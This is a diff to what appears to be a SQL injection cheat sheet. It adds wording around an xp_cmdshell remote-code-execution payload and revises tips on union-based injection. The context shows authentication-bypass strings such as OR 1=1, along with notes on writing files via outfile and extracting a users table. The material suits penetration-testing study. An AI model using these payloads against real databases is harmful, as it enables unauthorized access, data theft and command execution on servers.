@@ -159,7 +159,7 @@ meh' OR 2=2 LIMIT 1;#
 meh' OR 'a'='a
 meh' OR 1=1 --+
 ```
-Sometimes you'll find SQL server that have `xp_cmdshell` turned on
+Sometimes you'll run into Microsoft SQL server that have `xp_cmdshell` turned on, here's syntax for remote code execution
 ```php
 meh' exec master..xp_cmdshell '<command here>' --
 ```
@@ -169,7 +169,7 @@ Final notes!
 - `order by` clause works only with regular comments such as `--+`
 - Make sure to update ASCII range to include special characters if you're going after users table
 - `MySQL` don't have permissions to overwrite an exsisting file, make sure you go with new filename every single time with `outfile`.
-- Always input false value to the vulnerable paramater when working with union-based SQL command injection
+- Make sure the vulnerable paramater have false value when working with union-based SQL command injection
 
 To do list
 - Python or bash script to convert ascii to text after data extraction (grep output in this case)
